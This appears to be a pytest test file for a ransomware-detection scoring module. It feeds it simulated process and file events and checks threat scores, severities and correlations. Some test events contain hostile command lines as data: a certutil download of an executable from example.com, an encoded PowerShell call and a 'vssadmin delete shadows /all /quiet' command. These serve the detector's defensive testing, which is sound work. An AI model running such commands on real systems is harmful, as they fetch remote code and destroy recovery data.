from ransomeye.threat_assessment import assess_threat


def make_file_events(count=50):
    return [
        {
            "event_id": f"file-{index}",
            "timestamp": f"2026-08-08T15:00:00.{index:03d}Z",
            "source": "simulation",
            "event_type": "file_modify",
            "process_name": "test_process.exe",
            "file_path": f"C:\\Lab\\file{index}.encrypted",
        }
        for index in range(count)
    ]


def _severity_rank(severity: str) -> int:
    return {"SAFE": 0, "LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}.get(severity, -1)


def test_no_suspicious_events_are_safe():
    events = [
        {
            "event_id": "event-1",
            "timestamp": "2026-08-08T15:00:00Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "notepad.exe",
            "command_line": "notepad.exe",
            "pid": "1000",
        }
    ]

    result = assess_threat(events)

    assert result["score"] == 0
    assert result["severity"] == "SAFE"
    assert result["finding_count"] == 0


def test_single_encoded_powershell_is_not_safe():
    events = [
        {
            "event_id": "powershell-1",
            "timestamp": "2026-08-08T15:00:02Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -EncodedCommand SGVsbG8=",
            "pid": "4532",
        }
    ]

    result = assess_threat(events)

    assert result["score"] > 0
    assert result["severity"] != "SAFE"


def test_single_certutil_download_is_not_safe():
    events = [
        {
            "event_id": "certutil-1",
            "timestamp": "2026-08-08T15:00:03Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "certutil.exe",
            "command_line": "certutil.exe -urlcache -split -f http://example.com/file.exe output.bin",
            "pid": "4533",
        }
    ]

    result = assess_threat(events)

    assert result["score"] > 0
    assert result["severity"] != "SAFE"


def test_multiple_suspicious_findings_raise_score_and_severity():
    powershell_event = {
        "event_id": "powershell-1",
        "timestamp": "2026-08-08T15:00:02Z",
        "source": "sysmon",
        "event_type": "process_creation",
        "process_name": "powershell.exe",
        "command_line": "powershell.exe -EncodedCommand SGVsbG8=",
        "pid": "4532",
    }
    certutil_event = {
        "event_id": "certutil-1",
        "timestamp": "2026-08-08T15:00:03Z",
        "source": "sysmon",
        "event_type": "process_creation",
        "process_name": "certutil.exe",
        "command_line": "certutil.exe -urlcache -split -f http://example.com/file.exe output.bin",
        "pid": "4533",
    }

    single_powershell_result = assess_threat([powershell_event])
    single_certutil_result = assess_threat([certutil_event])
    combined_result = assess_threat([powershell_event, certutil_event])

    assert combined_result["score"] > single_powershell_result["score"]
    assert combined_result["score"] > single_certutil_result["score"]
    assert _severity_rank(combined_result["severity"]) >= _severity_rank(single_powershell_result["severity"])


def test_benign_powershell_get_date_is_safe():
    events = [
        {
            "event_id": "event-1",
            "timestamp": "2026-08-08T15:00:00Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe Get-Date",
            "pid": "1000",
        }
    ]

    result = assess_threat(events)

    assert result["score"] == 0
    assert result["severity"] == "SAFE"
    assert result["finding_count"] == 0


def test_benign_certutil_certificate_inspection_is_safe():
    events = [
        {
            "event_id": "event-2",
            "timestamp": "2026-08-08T15:00:01Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "certutil.exe",
            "command_line": "certutil.exe -store -user My",
            "pid": "1001",
        }
    ]

    result = assess_threat(events)

    assert result["score"] == 0
    assert result["severity"] == "SAFE"
    assert result["finding_count"] == 0


def test_high_confidence_findings_report_higher_confidence(monkeypatch):
    events = [
        {
            "event_id": "event-3",
            "timestamp": "2026-08-08T15:00:04Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -EncodedCommand SGVsbG8=",
            "pid": "4540",
        }
    ]

    high_confidence_finding = [
        {
            "type": "suspicious_powershell",
            "score": 10,
            "confidence": 0.95,
            "technique": "T1059.001",
            "process_name": "powershell.exe",
            "pid": "4540",
            "event_id": "event-3",
            "reason": "Suspicious PowerShell indicators detected",
        }
    ]
    low_confidence_finding = [
        {
            "type": "suspicious_powershell",
            "score": 10,
            "confidence": 0.40,
            "technique": "T1059.001",
            "process_name": "powershell.exe",
            "pid": "4540",
            "event_id": "event-3",
            "reason": "Suspicious PowerShell indicators detected",
        }
    ]

    monkeypatch.setattr(
        "ransomeye.threat_assessment.analyze_behavior",
        lambda events: high_confidence_finding,
    )
    high_confidence_result = assess_threat(events)

    monkeypatch.setattr(
        "ransomeye.threat_assessment.analyze_behavior",
        lambda events: low_confidence_finding,
    )
    low_confidence_result = assess_threat(events)

    assert high_confidence_result["confidence"] > low_confidence_result["confidence"]


def test_correlated_activity_produces_combined_score():
    events = make_file_events()

    events.extend(
        [
            {
                "event_id": "note-1",
                "timestamp": "2026-08-08T15:00:01Z",
                "source": "simulation",
                "event_type": "file_create",
                "process_name": "test_process.exe",
                "file_path": "C:\\Lab\\README_DECRYPT.txt",
            },
            {
                "event_id": "powershell-1",
                "timestamp": "2026-08-08T15:00:02Z",
                "source": "sysmon",
                "event_type": "process_creation",
                "process_name": "powershell.exe",
                "command_line": (
                    "powershell.exe -EncodedCommand SGVsbG8="
                ),
                "pid": "4532",
            },
            {
                "event_id": "recovery-1",
                "timestamp": "2026-08-08T15:00:03Z",
                "source": "sysmon",
                "event_type": "process_creation",
                "process_name": "vssadmin.exe",
                "command_line": (
                    "vssadmin delete shadows /all /quiet"
                ),
                "pid": "4533",
            },
        ]
    )

    result = assess_threat(events)

    assert result["score"] == 65

    assert result["severity"] == "MEDIUM"
    assert result["finding_count"] == 4
    assert "T1059.001" in result["techniques"]
    assert "T1490" in result["techniques"]
    assert result["confidence"] > 0
    assert result["correlation_count"] > 0
    assert len(result["correlations"]) > 0


def test_no_events_produces_zero_correlations():
    result = assess_threat([])

    assert result["correlation_count"] == 0
    assert result["correlations"] == []


def test_real_assessment_invokes_correlate_events_and_populates_results():
    events = [
        {
            "event_id": "evt-proc-1",
            "timestamp": "2026-08-08T15:00:00Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "cmd.exe",
            "pid": "1000",
            "process_guid": "{GUID-CMD-1000}",
        },
        {
            "event_id": "evt-proc-2",
            "timestamp": "2026-08-08T15:00:05Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "cmd.exe",
            "pid": "1000",
            "process_guid": "{GUID-CMD-1000}",
            "command_line": "cmd.exe /c dir",
        },
    ]

    result = assess_threat(events)

    assert result["correlation_count"] == 1
    assert len(result["correlations"]) == 1

    corr = result["correlations"][0]
    assert corr["incident_id"].startswith("INC-")
    assert corr["process_key"] == "guid:{GUID-CMD-1000}"
    assert corr["start_time"] in ("2026-08-08T15:00:00Z", "2026-08-08T15:00:00+00:00")
    assert corr["end_time"] in ("2026-08-08T15:00:05Z", "2026-08-08T15:00:05+00:00")
    assert corr["duration"] == 5.0
    assert corr["evidence_event_ids"] == ["evt-proc-1", "evt-proc-2"]


def test_multiple_correlated_incidents_represented_correctly():
    events = [
        {
            "event_id": "evt-proc-a",
            "timestamp": "2026-08-08T15:00:00Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "proc_a.exe",
            "process_guid": "{GUID-A}",
        },
        {
            "event_id": "evt-proc-b",
            "timestamp": "2026-08-08T15:00:01Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "proc_b.exe",
            "process_guid": "{GUID-B}",
        },
    ]

    result = assess_threat(events)

    assert result["correlation_count"] == 2
    assert len(result["correlations"]) == 2
    assert result["correlations"][0]["evidence_event_ids"] == ["evt-proc-a"]
    assert result["correlations"][1]["evidence_event_ids"] == ["evt-proc-b"]
